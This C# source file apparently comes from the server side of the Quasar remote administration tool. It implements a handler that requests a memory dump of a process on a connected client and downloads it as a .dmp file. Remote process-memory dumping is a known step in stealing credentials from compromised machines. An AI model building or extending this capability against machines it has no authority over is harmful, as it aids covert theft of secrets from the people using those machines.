using Quasar.Common.Enums;
using Quasar.Common.IO;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Administration.FileManager;
using Quasar.Common.Messages.Administration.TaskManager;
using Quasar.Common.Messages.other;
using Quasar.Common.Models;
using Quasar.Common.Networking;
using Quasar.Server.Enums;
using Quasar.Server.Models;
using Quasar.Server.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using static Quasar.Server.Messages.FileManagerHandler;

namespace Quasar.Server.Messages
{
    public class MemoryDumpHandler : MessageProcessorBase<string>, IDisposable
    {
        /// <summary>
        /// Raised when a file transfer updated.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event FileTransferUpdatedEventHandler FileTransferUpdated;

        /// <summary>
        /// Reports updated file transfers.
        /// </summary>
        /// <param name="transfer">The updated file transfer.</param>
        private void OnFileTransferUpdated(FileTransfer transfer)
        {
            SynchronizationContext.Post(t =>
            {
                var handler = FileTransferUpdated;
                handler?.Invoke(this, (FileTransfer)t);
            }, transfer.Clone());
        }

        /// <summary>
        /// Keeps track of all active file transfers. Finished or canceled transfers get removed.
        /// </summary>
        private readonly List<FileTransfer> _activeFileTransfers = new List<FileTransfer>();

        /// <summary>
        /// Used in lock statements to synchronize access between UI thread and thread pool.
        /// </summary>
        private readonly object _syncLock = new object();

        /// <summary>
        /// The client which is associated with this file manager handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Used to only allow two simultaneous file uploads.
        /// </summary>
        private readonly Semaphore _limitThreads = new Semaphore(2, 2);

        /// <summary>
        /// Path to the base download directory of the client.
        /// </summary>
        private readonly string _baseDownloadPath;

        private readonly TaskManagerHandler _taskManagerHandler;

        /// <summary>
        /// Initializes a new instance of the <see cref="FileManagerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        /// <param name="subDirectory">Optional sub directory name.</param>
        public MemoryDumpHandler(Client client, string subDirectory = "") : base(true)
        {
            _client = client;
            _baseDownloadPath = Path.Combine(client.Value.DownloadDirectory, subDirectory);
            _taskManagerHandler = new TaskManagerHandler(client);
            //MessageHandler.Register(_taskManagerHandler);
            /*
                We arent registering the message handler because we dont want this form listening for every response packet.
                Currently this creates a dump handler for every dump request, which might not be the best solution, but since
                you cant call a memory dump on multiple clients at once, I think its fine. 
            */
        }

        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is DoProcessDumpResponse;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoProcessDumpResponse response:
                    Execute(sender, response);
                    break;
            }
        }

        private void Execute(ISender sender, DoProcessDumpResponse response)
        {
            this.BeginDumpDownload(response);
        }

        public void BeginDumpDownload(DoProcessDumpResponse response)
        {
            if (response.Length == 0)
                return;

            int id = GetUniqueFileTransferId();

            if (!Directory.Exists(_baseDownloadPath))
                Directory.CreateDirectory(_baseDownloadPath);

            string fileName = $"{response.UnixTime}_{response.Pid}_{response.ProcessName}.dmp"; //fill this
            string localPath = Path.Combine(_baseDownloadPath, fileName);

            int i = 1;
            while (File.Exists(localPath))
            {
                var newFileName = string.Format("{0}({1}){2}", Path.GetFileNameWithoutExtension(localPath), i, Path.GetExtension(localPath));
                localPath = Path.Combine(_baseDownloadPath, newFileName);
                i++;
            }

            var transfer = new FileTransfer
            {
                Id = id,
                Type = TransferType.Download,
                LocalPath = localPath,
                RemotePath = response.DumpPath,
                Status = "Pending...",
                TransferredSize = 0
            };

            try
            {
                transfer.FileSplit = new FileSplit(transfer.LocalPath, FileAccess.Write);
            }
            catch (Exception)
            {
                transfer.Status = "Error writing file";
                OnFileTransferUpdated(transfer);
                return;
            }

            lock (_syncLock)
            {
                _activeFileTransfers.Add(transfer);
            }

            OnFileTransferUpdated(transfer);

            _client.Send(new FileTransferRequest { RemotePath = response.DumpPath, Id = id });
        }

        /// <summary>
        /// Generates a unique file transfer id.
        /// </summary>
        /// <returns>A unique file transfer id.</returns>
        private int GetUniqueFileTransferId()
        {
            int id;
            lock (_syncLock)
            {
                do
                {
                    id = FileTransfer.GetRandomTransferId();
                    // generate new id until we have a unique one
                } while (_activeFileTransfers.Any(f => f.Id == id));
            }

            return id;
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_syncLock)
                {
                    foreach (var transfer in _activeFileTransfers)
                    {
                        _client.Send(new FileTransferCancel { Id = transfer.Id });
                        transfer.FileSplit?.Dispose();
                        if (transfer.Type == TransferType.Download)
                            File.Delete(transfer.LocalPath);
                    }

                    _activeFileTransfers.Clear();
                }

                //MessageHandler.Unregister(_taskManagerHandler);
                /*
                    See above MessageHandler.Register to understand why this is commented out 
                */
            }
        }
    }
}
